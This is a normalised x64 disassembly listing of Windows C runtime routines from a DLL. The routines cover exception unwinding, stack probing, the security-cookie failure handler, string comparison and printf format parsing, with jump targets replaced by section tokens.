add rcx 0x8
mov rax [ rcx + 0x18 ]
cmp rax [ rdx + rcx + 0x18 ]
jne r-xdata
add rcx 0x8
add rcx 0x20
dec r9
jne r-xdata
and r8 0x1f
sub_18000d1b8
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rdi
push rbp
mov rbp rsp
sub rsp 0x60
mov rdi rdx
mov rbx rcx
lea rcx [ rbp - 0x40 ]
lea rdx [ r--data ]
mov r8d 0x40
call sub_18000c440
lea rdx [ rbp + 0x10 ]
mov rcx rdi
mov [ rbp - 0x18 ] rbx
mov [ rbp - 0x10 ] rdi
call RtlPcToFileHeader
mov r11 rax
mov [ rbp + 0x10 ] rax
mov [ rbp - 0x8 ] rax
test rdi rdi
je r-xdata
mov r8d [ rbp - 0x28 ]
mov edx [ rbp - 0x3c ]
mov ecx [ rbp - 0x40 ]
lea r9 [ rbp - 0x20 ]
call [ RaiseException@IAT ]
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov rsp r11
pop rbp
retn
test [ rdi ] 0x8
mov ecx 0x1994000
je r-xdata
mov eax [ rbp - 0x20 ]
test r11 r11
cmove eax ecx
mov [ rbp - 0x20 ] eax
mov [ rbp - 0x20 ] ecx
jmp r-xdata
sub_18000d24c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
movsxd rdi [ r8 + 0xc ]
mov r15 rcx
mov rcx r8
mov rbp r9
mov r13 r8
mov r14 rdx
call sub_180011914
mov r10 [ r15 ]
mov [ rbp ] r10
mov r12d eax
test edi edi
je r-xdata
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x68 ]
mov rax rbp
mov rbp [ rsp + 0x60 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea rcx [ rdi + rdi * 4 ]
lea rsi [ rcx * 4 - 0x14 ]
sub rsi 0x14
dec edi
je r-xdata
cmp r12d [ rbx + 0x8 ]
jg r-xdata
jmp r-xdata
mov rcx [ r14 ]
lea rdx [ rsp + 0x50 ]
xor r8d r8d
call RtlLookupFunctionEntry
movsxd r8 [ rbx + 0x10 ]
mov r9d [ rbx + 0xc ]
add r8 [ rsp + 0x50 ]
mov r10d [ rax ]
xor ecx ecx
test r9d r9d
je r-xdata
movsxd rbx [ r13 + 0x10 ]
add rbx [ r14 + 0x8 ]
add rbx rsi
cmp r12d [ rbx + 0x4 ]
jle r-xdata
cmp ecx r9d
jb r-xdata
lea rdx [ r8 + 0xc ]
mov rax [ r15 ]
lea rcx [ rcx + rcx * 4 ]
movsxd rcx [ r8 + rcx * 4 + 0x10 ]
mov rcx [ rcx + rax ]
mov [ rbp ] rcx
inc ecx
add rdx 0x14
cmp ecx r9d
jb r-xdata
movsxd rax [ rdx ]
cmp rax r10
je r-xdata
sub_18000d3a0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
lea r9 [ rax + 0x18 ]
mov rbp r8
mov r12 rdx
call sub_18000d24c
mov rdx r12
mov rcx rbp
mov r13 rax
call sub_180011914
movsxd rdi [ rbp + 0xc ]
mov esi eax
test edi edi
je r-xdata
xor edx edx
lea rcx [ rdi + rdi * 4 ]
lea rbx [ rcx * 4 - 0x14 ]
mov r9d [ rdx + 0x4 ]
or r9d 0xffffffff
jmp r-xdata
sub rbx 0x14
dec edi
jne r-xdata
cmp esi [ rdx + 0x8 ]
jle r-xdata
mov r8 rbp
mov rdx r12
mov rcx r13
call sub_180011b7c
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
call sub_18000f510
movsxd rcx [ rbp + 0x10 ]
mov rdx [ rax + 0x128 ]
add rdx rcx
add rdx rbx
cmp esi [ rdx + 0x4 ]
jle r-xdata
test rdx rdx
jne r-xdata
sub_18000d44c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rbx r9
mov rdi r8
mov rsi rcx
mov [ rsp + 0x50 ] rdx
call sub_18000f510
mov rdx [ rbx + 0x8 ]
mov [ rax + 0x128 ] rdx
call sub_18000f510
mov rdx [ rsi + 0x38 ]
mov [ rax + 0x130 ] rdx
call sub_18000f510
mov rdx [ rbx + 0x38 ]
mov r8d [ rdx ]
lea rdx [ rsp + 0x50 ]
mov r9 rbx
add r8 [ rax + 0x128 ]
xor eax eax
mov rcx rsi
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r8
mov r8 rdi
call sub_180012afc
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
sub_18000d4d4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rsi r9
mov rbp r8
mov rbx rdx
mov rdi rcx
call sub_18000f510
mov [ rax + 0x138 ] rbx
mov rbx [ rdi ]
call sub_18000f510
mov rdx [ rbx + 0x38 ]
mov rcx [ rsp + 0x78 ]
mov r9 [ rsp + 0x70 ]
mov [ rsp + 0x38 ] 0x1
mov [ rax + 0x130 ] rdx
xor ebx ebx
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rcx
mov rcx [ rdi ]
mov r8 rsi
mov rdx rbp
call sub_180012afc
call sub_18000f510
mov rcx [ rsp + 0x80 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov [ rax + 0x138 ] rbx
lea eax [ rbx + 0x1 ]
mov rbx [ rsp + 0x50 ]
mov [ rcx ] 0x1
add rsp 0x40
pop rdi
retn
sub_18000d578
mov rax rsp
mov [ rax + 0x20 ] r9
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
mov [ rax + 0x8 ] rcx
push rbx
sub rsp 0x60
mov rbx rcx
and [ rax - 0x28 ] 0x0
mov [ rax - 0x20 ] rcx
mov [ rax - 0x18 ] r8
call sub_18000f510
mov r8 [ rax + 0xe0 ]
lea rdx [ rsp + 0x48 ]
mov ecx [ rbx ]
call r8
mov [ rsp + 0x40 ] 0x0
jmp r-xdata
mov eax [ rsp + 0x40 ]
add rsp 0x60
pop rbx
retn
sub_18000d5cc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
movsxd rbx [ rdx + 0xc ]
mov r12 [ rsp + 0x70 ]
mov rdi rdx
mov rcx rdi
mov rdx r12
mov r13d r9d
xor ebp ebp
call sub_180011914
mov esi eax
test ebx ebx
jne r-xdata
mov r10 [ rsp + 0x68 ]
mov r8 [ rsp + 0x60 ]
or r11d 0xffffffff
mov [ r10 ] r11d
mov edx ebx
mov [ r8 ] r11d
test ebx ebx
je r-xdata
call sub_180012d48
test edx edx
je r-xdata
movsxd rcx [ rdi + 0x10 ]
lea rax [ rbx + rbx * 4 ]
lea rcx [ rcx + rax * 4 ]
mov rax [ r12 + 0x8 ]
lea r9 [ rcx + rax - 0xc ]
xor edx edx
test ebx ebx
je r-xdata
lea eax [ rdx - 0x1 ]
lea rdx [ rax + rax * 4 ]
movsxd rax [ rdi + 0x10 ]
lea rbp [ rax + rdx * 4 ]
add rbp [ r12 + 0x8 ]
sub r9 0x14
add edx r11d
jne r-xdata
cmp esi [ r9 ]
jle r-xdata
and [ r8 ] 0x0
and [ r10 ] 0x0
xor eax eax
xor r9d r9d
cmp esi [ r9 - 0x4 ]
jle r-xdata
cmp r13d [ rcx ]
jl r-xdata
mov eax [ rbp + 0x4 ]
cmp [ rcx ] eax
jle r-xdata
inc edx
add r9 0x14
cmp edx ebx
jb r-xdata
cmp r13d [ rcx + 0x4 ]
jg r-xdata
mov eax [ rbp + 0x8 ]
cmp [ rcx + 0x4 ] eax
jg r-xdata
movsxd rcx [ rdi + 0x10 ]
add rcx [ r12 + 0x8 ]
add rcx r9
test rbp rbp
je r-xdata
cmp [ r8 ] r11d
je r-xdata
mov eax [ r8 ]
cmp eax r11d
cmove eax edx
mov [ r8 ] eax
lea eax [ rdx + 0x1 ]
mov [ r10 ] eax
mov eax [ r8 ]
lea rcx [ rax + rax * 4 ]
movsxd rax [ rdi + 0x10 ]
lea rax [ rax + rcx * 4 ]
add rax [ r12 + 0x8 ]
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
sub_18000d6f8
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx ] rdx
call sub_18000f510
cmp rbx [ rax + 0x120 ]
jae r-xdata
xor ecx ecx
call sub_18000f510
mov rcx [ rax + 0x120 ]
jmp r-xdata
mov [ rbx + 0x8 ] rcx
call sub_18000f510
mov [ rax + 0x120 ] rbx
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18000d73c
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18000f510
mov rdx [ rax + 0x120 ]
jmp r-xdata
test rdx rdx
jne r-xdata
cmp [ rdx ] rbx
je r-xdata
lea eax [ rdx + 0x1 ]
xor eax eax
jmp r-xdata
mov rdx [ rdx + 0x8 ]
add rsp 0x20
pop rbx
retn
sub_18000d770
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rcx
call sub_18000f510
cmp rdi [ rax + 0x120 ]
je r-xdata
call sub_18000f510
mov rbx [ rax + 0x120 ]
jmp r-xdata
call sub_180012d48
test rbx rbx
jne r-xdata
cmp rdi rbx
je r-xdata
call sub_180012d48
call sub_18000f510
mov rcx [ rbx + 0x8 ]
mov [ rax + 0x120 ] rcx
jmp r-xdata
mov rbx [ rbx + 0x8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_18000d7d0
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x4b8 ]
sub rsp 0x5b8
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4a0 ] rax
mov rbx [ rbp + 0x520 ]
mov rdi [ rbp + 0x530 ]
mov r14 [ rbp + 0x538 ]
mov r13 rdx
mov r15 rcx
mov r12 r8
lea rcx [ rsp + 0x30 ]
lea rdx [ r--data ]
mov r8d 0x98
mov rsi r9
call sub_18000c440
movsxd rax [ rbp + 0x528 ]
mov rdx [ r14 ]
mov rcx [ r15 ]
mov [ rsp + 0x68 ] rax
movzx eax [ rbp + 0x540 ]
lea r11 [ sub_180011e44 ]
lea r8 [ rsp + 0x30 ]
mov [ rbp - 0x78 ] rax
mov rax [ r14 + 0x40 ]
xor r9d r9d
mov [ rsp + 0x28 ] rax
lea rax [ rbp - 0x30 ]
mov [ rsp + 0x50 ] r11
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x70 ] r12
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x78 ] rdi
mov [ rbp - 0x80 ] r13
mov [ rbp - 0x70 ] 0x19930520
call RtlUnwindEx
mov rcx [ rbp + 0x4a0 ]
xor rcx rsp
call sub_18000c060
add rsp 0x5b8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
sub_18000d8d0
sub rsp 0x10
mov [ rsp ] r10
mov [ rsp + 0x8 ] r11
xor r11 r11
lea r10 [ rsp + 0x18 ]
sub r10 rax
cmovb r10 r11
mov r11 [ gs : 0x10 ]
cmp r10 r11
jae r-xdata
mov r10 [ rsp ]
mov r11 [ rsp + 0x8 ]
add rsp 0x10
retn
and r10w 0xf000
lea r11 [ r11 - 0x1000 ]
mov [ r11 ] 0x0
cmp r10 r11
jne r-xdata
sub_18000d920
mov [ rsp + 0x8 ] rcx
sub rsp 0x88
lea rcx [ rw-data ]
call [ RtlCaptureContext@IAT ]
mov rax [ rw-data ]
mov [ rsp + 0x58 ] rax
xor r8d r8d
lea rdx [ rsp + 0x60 ]
mov rcx [ rsp + 0x58 ]
call RtlLookupFunctionEntry
mov [ rsp + 0x50 ] rax
cmp [ rsp + 0x50 ] 0x0
je r-xdata
mov rax [ rsp + 0x88 ]
mov [ rw-data ] rax
lea rax [ rsp + 0x88 ]
add rax 0x8
mov [ rw-data ] rax
mov [ rsp + 0x38 ] 0x0
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x28 ] rax
lea rax [ rw-data ]
mov [ rsp + 0x20 ] rax
mov r9 [ rsp + 0x50 ]
mov r8 [ rsp + 0x58 ]
mov rdx [ rsp + 0x60 ]
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov edx 0xc0000409
mov rcx rax
call [ TerminateProcess@IAT ]
add rsp 0x88
retn
mov ecx 0x1
call sub_180012d90
mov rax [ rw-data ]
mov [ rw-data ] rax
mov rax [ rsp + 0x90 ]
mov [ rw-data ] rax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov rax [ rw-data ]
mov [ rsp + 0x68 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x70 ] rax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
mov ecx 0x1
call sub_180012d90
xor ecx ecx
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ r--data ]
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
sub_18000da6c
push rbx
sub rsp 0x30
mov rbx rcx
mov ecx 0xe
call sub_180012fa4
nop
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
mov ecx 0xe
call sub_180012ea4
add rsp 0x30
pop rbx
retn
mov rcx [ rw-data ]
lea rdx [ rw-data ]
mov rcx [ rbx + 0x8 ]
call sub_18000ec1c
and [ rbx + 0x8 ] 0x0
cmp [ rcx ] rax
jne r-xdata
mov rdx rcx
jmp r-xdata
mov rax [ rcx + 0x8 ]
mov [ rdx + 0x8 ] rax
call sub_18000ec1c
jmp r-xdata
mov [ rsp + 0x20 ] rcx
test rcx rcx
je r-xdata
sub_18000daf0
sub rdx rcx
mov r9 rdx
test cl 0x7
je r-xdata
mov r11 0x8101010101010100
mov al [ rcx ]
mov dl [ rcx + r9 ]
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
inc rcx
test al al
je r-xdata
mov r10 0x7efefefefefefeff
add r10 rdx
xor rax 0xffffffffffffffff
add rcx 0x8
xor rax r10
test r11 rax
je r-xdata
xor eax eax
retn
test rcx 0x7
jne r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
jmp r-xdata
nop
test dl dl
je r-xdata
xor eax eax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_18000dba0
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov [ rax + 0x8 ] ecx
push rdi
sub rsp 0x20
mov rcx rdx
mov rbx rdx
call sub_180013c6c
mov ecx [ rbx + 0x18 ]
movsxd rsi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x9
xor edi edi
test cl 0x1
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x22
jmp r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov eax [ rbx + 0x18 ]
mov [ rbx + 0x8 ] edi
and eax 0xffffffef
or eax 0x2
mov [ rbx + 0x18 ] eax
test eax 0x10c
jne r-xdata
mov [ rbx + 0x8 ] edi
test cl 0x10
je r-xdata
or [ rbx + 0x18 ] 0x20
test [ rbx + 0x18 ] 0x108
je r-xdata
call sub_180013a58
add rax 0x30
cmp rbx rax
je r-xdata
or ecx 0x20
mov [ rbx + 0x18 ] ecx
jmp r-xdata
mov rax [ rbx + 0x10 ]
and ecx 0xfffffffe
mov [ rbx ] rax
mov [ rbx + 0x18 ] ecx
mov ebp 0x1
lea rdx [ rsp + 0x30 ]
mov ecx esi
mov r8d ebp
call sub_1800138c4
mov edi eax
mov ebp [ rbx ]
mov rdx [ rbx + 0x10 ]
sub ebp [ rbx + 0x10 ]
lea rax [ rdx + 0x1 ]
mov [ rbx ] rax
mov eax [ rbx + 0x24 ]
dec eax
mov [ rbx + 0x8 ] eax
test ebp ebp
jle r-xdata
mov ecx esi
call sub_1800139f8
test eax eax
jne r-xdata
call sub_180013a58
add rax 0x60
cmp rbx rax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
movzx eax [ rsp + 0x30 ]
cmp esi 0xffffffff
je r-xdata
mov r8d ebp
mov ecx esi
call sub_1800138c4
mov edi eax
jmp r-xdata
mov rcx rbx
call sub_1800139a4
lea rcx [ rw-data ]
cmp esi 0xfffffffe
je r-xdata
mov rcx [ rbx + 0x10 ]
mov al [ rsp + 0x30 ]
mov [ rcx ] al
jmp r-xdata
xor edx edx
mov ecx esi
lea r8d [ rdx + 0x2 ]
call sub_180013080
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx rsi
mov rax rsi
lea rdx [ rw-data ]
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
add rcx [ rdx + rax * 8 ]
jmp r-xdata
cmp edi ebp
jne r-xdata
test [ rcx + 0x8 ] 0x20
je r-xdata
sub_18000dd30
push rbx
sub rsp 0x20
test [ rdx + 0x18 ] 0x40
mov rbx r8
je r-xdata
dec [ rdx + 0x8 ]
js r-xdata
cmp [ rdx + 0x10 ] 0x0
jne r-xdata
movsx ecx cl
call sub_18000dba0
mov rax [ rdx ]
mov [ rax ] cl
inc [ rdx ]
movzx eax cl
jmp r-xdata
inc [ r8 ]
jmp r-xdata
inc [ rbx ]
or [ rbx ] eax
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
add rsp 0x20
pop rbx
retn
sub_18000dd78
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1d0 ]
sub rsp 0x2d0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1c8 ] rax
xor eax eax
mov rbx rcx
mov [ rsp + 0x68 ] rcx
mov rdi rdx
lea rcx [ rbp - 0x80 ]
mov rdx r8
mov r14 r9
mov [ rsp + 0x60 ] eax
mov r13d eax
mov [ rsp + 0x54 ] eax
mov r15d eax
mov [ rsp + 0x48 ] eax
mov [ rsp + 0x5c ] eax
mov [ rsp + 0x50 ] eax
call sub_18000cd7c
xor r10d r10d
test rbx rbx
jne r-xdata
or esi 0xffffffff
test [ rbx + 0x18 ] 0x40
lea r9 [ __dos_header ]
jne r-xdata
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
xor r11d r11d
cmp [ rbp - 0x68 ] r11b
je r-xdata
test rdi rdi
je r-xdata
mov rcx rbx
call sub_180013c6c
lea rdx [ rw-data ]
cmp eax esi
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x70 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
xor r11d r11d
cmp [ rbp - 0x68 ] r11b
mov r12b [ rdi ]
mov r8d r10d
mov [ rsp + 0x40 ] r10d
mov [ rsp + 0x44 ] r10d
mov edx r10d
mov [ rbp - 0x60 ] r10
test r12b r12b
je r-xdata
mov r8 rdx
lea r9 [ __dos_header ]
cmp eax 0xfffffffe
je r-xdata
mov rcx [ rbp + 0x1c8 ]
xor rcx rsp
call sub_18000c060
mov rbx [ rsp + 0x320 ]
add rsp 0x2d0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax esi
jmp r-xdata
mov rax [ rbp - 0x70 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x68 ] r10b
je r-xdata
mov rbx [ rbp - 0x48 ]
mov r11d 0x200
cmp eax esi
je r-xdata
movsxd r8 eax
lea r9 [ __dos_header ]
mov rcx r8
and r8d 0x1f
sar rcx 0x5
imul r8 r8 0x58
add r8 [ r9 + rcx * 8 + 0x330e0 ]
jmp r-xdata
mov eax r8d
mov rcx [ rbp - 0x70 ]
and [ rcx + 0xc8 ] 0xfffffffd
lea eax [ r12 - 0x20 ]
cmp al 0x58
ja r-xdata
test [ rdx + 0x38 ] 0x80
je r-xdata
cmp eax 0xfffffffe
je r-xdata
test [ r8 + 0x38 ] 0x7f
jne r-xdata
mov ecx r10d
movsx rax r12b
movsx ecx [ rax + r9 + 0x21ac0 ]
and ecx 0xf
jmp r-xdata
xor r10d r10d
movsxd rdx eax
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
add rdx [ r9 + rax * 8 + 0x330e0 ]
lea rdx [ rbp - 0x80 ]
movzx ecx r12b
mov [ rsp + 0x50 ] r10d
call sub_180013c94
test eax eax
je r-xdata
dec ecx
je r-xdata
movsxd rax edx
movsxd rcx ecx
lea rdx [ rax + rcx * 8 ]
movsx edx [ rdx + r9 + 0x21ae0 ]
sar edx 0x4
mov [ rsp + 0x58 ] edx
mov ecx edx
test edx edx
je r-xdata
mov rdx [ rsp + 0x68 ]
lea r8 [ rsp + 0x40 ]
mov cl r12b
call sub_18000dd30
mov r8d [ rsp + 0x40 ]
xor r10d r10d
jmp r-xdata
mov rdx [ rsp + 0x68 ]
lea r8 [ rsp + 0x40 ]
mov cl r12b
call sub_18000dd30
mov r12b [ rdi ]
inc rdi
test r12b r12b
je r-xdata
mov [ rsp + 0x78 ] r10d
mov [ rsp + 0x5c ] r10d
mov [ rsp + 0x54 ] r10d
mov [ rsp + 0x48 ] r10d
mov r13d r10d
mov r15d esi
mov [ rsp + 0x50 ] r10d
jmp r-xdata
dec ecx
je r-xdata
mov edx [ rsp + 0x58 ]
mov r11d 0x200
lea r9 [ __dos_header ]
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
xor eax eax
cmp [ rbp - 0x68 ] al
jmp r-xdata
mov r12b [ rdi ]
test r12b r12b
jne r-xdata
cmp r12b 0x20
je r-xdata
dec ecx
je r-xdata
inc rdi
mov [ rbp - 0x50 ] rdi
test r8d r8d
js r-xdata
je r-xdata
or r13d 0x2
jmp r-xdata
cmp r12b 0x23
je r-xdata
cmp r12b 0x2a
jne r-xdata
dec ecx
je r-xdata
bts r13d 0x7
jmp r-xdata
cmp r12b 0x2b
je r-xdata
mov eax [ rsp + 0x54 ]
lea ecx [ rax + rax * 4 ]
movsx eax r12b
lea eax [ rax + rcx * 2 - 0x30 ]
mov eax [ r14 ]
add r14 0x8
mov [ rsp + 0x54 ] eax
test eax eax
jns r-xdata
mov r15d r10d
jmp r-xdata
dec ecx
je r-xdata
or r13d 0x1
jmp r-xdata
cmp r12b 0x2d
je r-xdata
or r13d 0x4
neg eax
jmp r-xdata
cmp r12b 0x2a
jne r-xdata
dec ecx
je r-xdata
or r13d 0x4
jmp r-xdata
cmp r12b 0x30
jne r-xdata
mov [ rsp + 0x54 ] eax
jmp r-xdata
lea ecx [ r15 + r15 * 4 ]
movsx eax r12b
lea r15d [ rax + rcx * 2 - 0x30 ]
jmp r-xdata
mov r15d [ r14 ]
add r14 0x8
test r15d r15d
jns r-xdata
cmp r12b 0x49
je r-xdata
dec ecx
jne r-xdata
or r13d 0x8
jmp r-xdata
mov r15d esi
jmp r-xdata
mov al [ rdi ]
bts r13d 0xf
cmp al 0x36
jne r-xdata
cmp r12b 0x68
je r-xdata
movsx eax r12b
cmp eax 0x64
jg r-xdata
cmp al 0x33
jne r-xdata
cmp [ rdi + 0x1 ] 0x34
jne r-xdata
or r13d 0x20
jmp r-xdata
cmp r12b 0x6c
je r-xdata
cmp eax 0x65
jl r-xdata
je r-xdata
cmp al 0x64
je r-xdata
cmp [ rdi + 0x1 ] 0x32
jne r-xdata
add rdi 0x2
bts r13d 0xf
jmp r-xdata
cmp [ rdi ] 0x6c
jne r-xdata
cmp r12b 0x77
jne r-xdata
cmp [ rsp + 0x5c ] r10d
jne r-xdata
cmp eax 0x67
jle r-xdata
or r13d 0x40
cmp eax 0x41
je r-xdata
cmp al 0x69
je r-xdata
add rdi 0x2
btr r13d 0xf
jmp r-xdata
or r13d 0x10
jmp r-xdata
inc rdi
bts r13d 0xc
jmp r-xdata
bts r13d 0xb
jmp r-xdata
mov r8d [ rsp + 0x40 ]
test r13b 0x40
je r-xdata
or r13d 0x40
lea rbx [ rbp - 0x40 ]
mov esi r11d
test r15d r15d
jns r-xdata
cmp eax 0x69
je r-xdata
bt r13d 0xc
jb r-xdata
mov r8 [ r14 ]
add r14 0x8
jmp r-xdata
mov [ rsp + 0x78 ] 0x1
add r12b 0x20
cmp eax 0x43
je r-xdata
cmp al 0x6f
je r-xdata
mov rdi [ rbp - 0x50 ]
or esi 0xffffffff
mov rcx rax
call sub_18000ec1c
mov r8d [ rsp + 0x40 ]
xor r10d r10d
mov [ rbp - 0x60 ] r10
mov edi [ rsp + 0x48 ]
bt r13d 0x8
jae r-xdata
jne r-xdata
mov r15d 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
add r14 0x8
test r13b 0x20
je r-xdata
mov [ rsp + 0x70 ] r14
test r13d 0x830
jne r-xdata
cmp eax 0x45
je r-xdata
cmp al 0x75
je r-xdata
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x4c ]
mov r8 rsi
mov edx edi
call sub_18001404c
test r13b 0x8
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x20
call sub_180013ff8
test r13b 0x1
je r-xdata
mov [ rsp + 0x4c ] 0x2d
jmp r-xdata
cmp r15d r11d
cmovg r15d r11d
cmp r15d 0xa3
jle r-xdata
cmp r12b 0x67
jne r-xdata
mov rax [ r14 ]
mov rcx [ rw-data ]
add r14 0x8
movsx edi r12b
movsxd rsi esi
mov [ rbp - 0x48 ] rax
call [ DecodePointer@IAT ]
lea rcx [ rbp - 0x80 ]
mov r9d edi
mov [ rsp + 0x30 ] rcx
mov ecx [ rsp + 0x78 ]
mov r8 rsi
mov [ rsp + 0x28 ] ecx
lea rcx [ rbp - 0x48 ]
mov rdx rbx
mov [ rsp + 0x20 ] r15d
call rax
mov edi r13d
and edi 0x80
je r-xdata
mov rdi [ r14 ]
add r14 0x8
call sub_180013e08
xor r10d r10d
test eax eax
je r-xdata
cmp eax 0x6f
je r-xdata
test r13b 0x40
je r-xdata
mov [ rsp + 0x70 ] r14
test r13b 0x40
je r-xdata
test eax r13d
jne r-xdata
test r8 r8
jns r-xdata
add r14 0x8
test r13d 0x810
je r-xdata
bts r13d 0xb
cmp eax 0x47
je r-xdata
cmp al 0x78
je r-xdata
mov edi [ rsp + 0x44 ]
xor eax eax
cmp [ rsp + 0x50 ] eax
je r-xdata
test r13b 0x4
jne r-xdata
test r13b 0x2
je r-xdata
mov [ rsp + 0x4c ] 0x2b
mov edi 0x1
mov [ rsp + 0x48 ] edi
jmp r-xdata
lea edi [ r15 + 0x15d ]
movsxd rcx edi
call sub_18000f72c
mov [ rbp - 0x60 ] rax
test rax rax
je r-xdata
mov r15d 0x1
jmp r-xdata
cmp r12b 0x67
jne r-xdata
test r15d r15d
jne r-xdata
mov eax [ rsp + 0x40 ]
test r13b 0x20
je r-xdata
mov r9d 0x8
test r13b r13b
jns r-xdata
cmp eax 0x70
je r-xdata
mov r8d [ r14 - 0x8 ]
movsxd r8 [ r14 - 0x8 ]
jmp r-xdata
movzx r8d [ r14 - 0x8 ]
jmp r-xdata
movsx r8 [ r14 - 0x8 ]
jmp r-xdata
test r15d r15d
jns r-xdata
bt r13d 0xc
jb r-xdata
neg r8
bts r13d 0x8
mov al [ r14 - 0x8 ]
mov [ rsp + 0x44 ] 0x1
mov [ rbp - 0x40 ] al
movzx r9d [ r14 - 0x8 ]
lea rdx [ rbp - 0x40 ]
lea rcx [ rsp + 0x44 ]
mov r8 r11
call sub_180013fe4
xor r10d r10d
test eax eax
je r-xdata
cmp eax 0x53
je r-xdata
cmp al 0x58
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx edi
mov rcx rbx
call sub_18001404c
xor r10d r10d
test edi edi
jle r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x30
call sub_180013ff8
mov [ rsp + 0x4c ] 0x20
jmp r-xdata
mov r12d [ rsp + 0x54 ]
mov rsi [ rsp + 0x68 ]
sub r12d [ rsp + 0x44 ]
sub r12d edi
test r13b 0xc
jne r-xdata
mov r15d 0xa3
mov rbx rax
mov esi edi
jmp r-xdata
cmp [ rbx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x80 ]
mov rcx rbx
call rax
mov [ rdi ] eax
mov [ rdi ] ax
jmp r-xdata
mov edx [ rsp + 0x48 ]
or r13d r11d
jmp r-xdata
mov r15d 0x10
bts r13d 0xf
cmp eax 0x73
